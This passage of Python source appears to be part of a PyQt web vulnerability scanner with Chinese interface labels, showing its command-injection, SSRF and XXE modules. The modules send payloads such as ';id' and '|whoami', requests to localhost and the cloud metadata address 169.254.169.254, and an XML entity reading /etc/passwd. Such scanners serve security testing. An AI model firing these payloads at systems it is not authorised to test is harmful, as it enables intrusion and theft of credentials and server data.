        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始RCE扫描: {target}")
        
        payloads = [";id", "|id", ";whoami", "|whoami"]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?cmd=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                if 'uid=' in resp.text.lower() or 'root' in resp.text.lower():
                    self._add_result("cmd参数", "命令注入", payload, resp.text[:100])
                    self._add_log(LogLevel.SUCCESS, f"发现RCE: {payload}")
            except:
                pass
        
        self._add_log(LogLevel.INFO, "RCE扫描完成")


@register_module("ssrf")
class SSRFScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("ssrf", "服务端请求伪造")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._callback_input = QLineEdit()
        self._callback_input.setPlaceholderText("回调服务器地址")
        form_layout.addRow("回调地址:", self._callback_input)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "请求地址", "类型", "响应"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始SSRF扫描: {target}")
        
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?url=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                if resp.status_code == 200:
                    self._add_result("url参数", payload, "SSRF", resp.text[:100])
                    self._add_log(LogLevel.SUCCESS, f"发现SSRF: {payload}")
            except:
                pass
        
        self._add_log(LogLevel.INFO, "SSRF扫描完成")


@register_module("xxe")
class XXEScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("xxe", "XML外部实体注入")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._callback_input = QLineEdit()
        self._callback_input.setPlaceholderText("回调服务器地址")
        form_layout.addRow("回调地址:", self._callback_input)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["端点", "请求类型", "Payload类型", "证据"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始XXE扫描: {target}")
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
        
        for payload in xxe_payloads:
            if not self._is_scanning:
                break
            
            try:
                resp = requests.post(target, data=payload, 
                                    headers={'Content-Type': 'application/xml'},
                                    timeout=10, verify=False)
                
                if 'root:' in resp.text.lower():
                    self._add_result(target, "POST", "XXE", resp.text[:100])
                    self._add_log(LogLevel.SUCCESS, f"发现XXE漏洞")
            except:
                pass
        
        self._add_log(LogLevel.INFO, "XXE扫描完成")
